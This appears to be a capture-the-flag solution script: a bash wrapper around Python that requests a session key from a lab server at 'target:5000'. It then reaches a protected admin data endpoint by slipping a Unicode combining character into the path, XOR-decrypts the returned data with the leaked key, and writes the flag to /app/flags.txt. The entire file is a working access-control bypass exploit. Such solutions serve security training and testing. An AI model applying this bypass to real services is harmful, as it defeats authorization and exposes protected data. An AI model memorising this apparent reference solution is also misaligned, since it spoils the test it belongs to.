#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
import json
import pathlib
import urllib.parse
import urllib.request
import urllib.error

BASE = "http://target:5000"

req = urllib.request.Request(BASE + "/api/init")
with urllib.request.urlopen(req, timeout=30) as resp:
    data = json.loads(resp.read())
    session_key_hex = resp.headers.get("X-Session-Key", "")

session_id = data["session_id"]
session_key = bytes.fromhex(session_key_hex)

bypass_char = "\u1dc4"
path = "ad" + bypass_char + "min"
encoded = urllib.parse.quote(path, safe="")
url = BASE + "/api/data/" + encoded

req = urllib.request.Request(url, headers={"X-Session-Id": session_id})
with urllib.request.urlopen(req, timeout=30) as resp:
    encrypted = resp.read()

flag = bytes(b ^ session_key[i % len(session_key)] for i, b in enumerate(encrypted)).decode("utf-8")

pathlib.Path("/app/flags.txt").write_text(flag + "\n")
print(flag)
PY
